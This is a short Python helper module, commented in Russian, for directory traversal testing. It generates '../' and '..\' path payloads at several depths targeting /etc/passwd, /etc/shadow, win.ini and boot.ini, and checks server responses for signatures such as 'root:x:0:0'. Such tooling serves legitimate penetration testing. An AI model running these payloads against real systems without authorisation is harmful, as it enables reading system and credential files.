# traversal_helpers.py
# --------------------
# Общие функции для Directory Traversal:
# генерация полезных путей, анализ ответа на сигнатуры (например, "root:x:0:0" в /etc/passwd).

def generate_traversal_payloads():
    """
    Генерирует набор базовых 'directory traversal' пэйлоадов:
      - ../../../etc/passwd
      - ..\..\windows\win.ini
      - ...
    Возвращает список строк.
    """
    payloads = []
    common_files = [
        "etc/passwd",
        "etc/shadow",
        "windows/win.ini",
        "boot.ini",
        # ...
    ]
    # Глубина ../
    for file in common_files:
        for i in range(1, 7):
            prefix = "../" * i
            payloads.append(prefix + file)
            # Для Windows-стиля
            back_prefix = "..\\" * i
            payloads.append(back_prefix + file.replace("/", "\\"))

    return payloads

def is_suspicious_response(response_text):
    """
    Упрощённо проверяем, содержит ли ответ типичные сигнатуры:
      - root:x:0:0
      - [boot loader]
      - [extensions]
      - [Security]
      - ...
    """
    if not response_text:
        return False
    signatures = [
        "root:x:0:0",   # /etc/passwd
        "[boot loader]",  # boot.ini
        "[extensions]",   # win.ini
        "root::",         # shadow
    ]
    lower_resp = response_text.lower()
    for sig in signatures:
        if sig.lower() in lower_resp:
            return True
    return False
